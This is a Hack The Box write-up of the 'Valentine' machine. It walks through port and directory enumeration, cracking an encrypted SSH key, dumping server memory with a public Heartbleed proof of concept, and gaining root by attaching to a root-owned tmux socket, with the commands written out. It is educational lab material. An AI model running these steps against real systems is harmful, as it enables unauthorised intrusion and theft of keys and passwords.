---
layout: single
title: Valentine Writeup
date: '2020-05-01 15:51:21'
tags:
- hack-the-box
classes: wide
sidebar:
  - title: "Difficulty: Easy"
    image: /images/posts/2020/2020-05-01-valentine-writeup/valentine-6614854.png
    text: "https://app.hackthebox.eu/machines/127"
typora-copy-images-to: ../../images/posts/2020/${filename}/
---


A good example of how dangerous a commonly exploited vulnerability is.…

## Enumeration

Autorecon turned up the following ports
```
22/tcp open ssh syn-ack ttl 63 OpenSSH 5.9p1 Debian 5ubuntu1.10 (Ubuntu Linux; protocol 2.0)
80/tcp open http syn-ack ttl 63 Apache httpd 2.2.22 ((Ubuntu))
443/tcp open ssl/http syn-ack ttl 63 Apache httpd 2.2.22 ((Ubuntu))
```

While I waited for the rest of the tests to complete I had a quick look at the website which just displayed an image. Given nothing seemed immediately obvious I started up `gobuster` to see if any interesting directories existed.
```bash
    bob@b0b:~/htb/valentine$ gobuster dir -u 10.10.10.79 -w /usr/share/dirb/wordlists/common.txt 
    ===============================================================
    Gobuster v3.0.1
    by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
    ===============================================================
    [+] Url: http://10.10.10.79
    [+] Threads: 10
    [+] Wordlist: /usr/share/dirb/wordlists/common.txt
    [+] Status codes: 200,204,301,302,307,401,403
    [+] User Agent: gobuster/3.0.1
    [+] Timeout: 10s
    ===============================================================
    2020/05/01 12:56:09 Starting gobuster
    ===============================================================
    /.hta (Status: 403)
    /.htaccess (Status: 403)
    /.htpasswd (Status: 403)
    /cgi-bin/ (Status: 403)
    /decode (Status: 200)
    /dev (Status: 301)
    /encode (Status: 200)
    /index (Status: 200)
    /index.php (Status: 200)
    /server-status (Status: 403)
    ===============================================================
    2020/05/01 12:56:53 Finished
    ===============================================================
```
From the above we can see `/decode`, `/encode` and `/dev` might be interesting.

I took a look at `/dev` and found _hype\_key_ and _notes.txt_. _notes.txt_ had the following content

    To do:
    
    1) Coffee.
    2) Research.
    3) Fix decoder/encoder before going live.
    4) Make sure encoding/decoding is only done client-side.
    5) Don't use the decoder/encoder until any of this is done.
    6) Find a better way to take notes.

Which hints at the encode/decode paths we found earlier. hype\_key looked interesting and downloading it revealed a hex-encoded file. I converted this as follows:

    cat hype_key |xxd -r -p
    -----BEGIN RSA PRIVATE KEY-----
    Proc-Type: 4,ENCRYPTED
    DEK-Info: AES-128-CBC,AEB88C140F69BF2074788DE24AE48D46
    <snip>

Okay, an ssh key. The `Proc-Type: 4,ENCRYPTED` means that a passphrase will be needed though, so there is more work to do.

At this point I quickly ran John over the key to see if I could get the passphrase

```bash
/usr/share/john/ssh2john.py hype.rsa > hype.john
john --wordlist=/usr/share/wordlists/rockyou.txt --format=SSH hype.john 
```

Usually CTF challenges uses a passphrase from the rockyou list as the point isn't to bore you waiting for a hash to be bruteforced. This didn't turn up anything so I looked at other avenues.

The full nmap output had the following interesting output

    | ssl-heartbleed: 
    | VULNERABLE:
    | The Heartbleed Bug is a serious vulnerability in the popular OpenSSL cryptographic software library. It allows for stealing information intended to be protected by SSL/TLS encryption.
    | State: VULNERABLE

Which I guess makes sense given the name of the box!

## Initial exploitation

It's pretty easy to find a [Proof of Concept](https://github.com/sensepost/heartbleed-poc) for this as it's pretty old. Metasploit also has a module for it. We can grab this and run it like so

```bash
python heartbleed-poc.py -n 200 -q 10.10.10.79
```

The `-n 200` is the number of heartbeats to send, the more you send the more memory you get back. The `-q` is not tell it not to write the dump to stdout. I did originally try this with the default number of heartbeats (1) but didn't get anything useful.

After letting this run you can then do a `strings dump.bin |less` to look for goodies.

Something that is apparent is:

    0.1/decode.php
    Content-Type: application/x-www-form-urlencoded
    Content-Length: 42
    $text=aGVhcnRibGVlZGJlbGlldmV0aGVoeXBlCg==)

If we take `aGVhcnRibGVlZGJlbGlldmV0aGVoeXBlCg==` and base64 decode it

```bash
echo aGVhcnRibGVlZGJlbGlldmV0aGVoeXBlCg== |base64 -d
heartbleedbelievethehype
```

We get something that looks like a passphrase. Trying to use this with ssh gets us a session as the hype user and we can quickly grab user.txt from the Desktop directory.

## Escalation

As usual I start with a quick nose around the home directory of my current user account and immediately notice that .bash\_history has something in it. This is usually redirected to /dev/null in CTFs.

This included

```bash
tmux -L dev_sess 
tmux a -t dev_sess 
tmux --help
tmux -S /.devs/dev_sess
```

tmux is a terminal multiplexor, a bit like screen, so you can have multiple sessions running in the background. Looking at /.devs/ we see

```bash
srw-rw---- 1 root hype 0 May 1 03:10 dev_sess
```

This is a socket file for tmux, and the _-S_ option being used earlier was telling tmux to use this instead of the defaults it would normally use. The socket is owned by root and set _suid_ so we might get a root session if we connect.

Running `tmux -S /.devs/dev_sess` does instead give us a root shell, and we can grab `/root/root.txt`

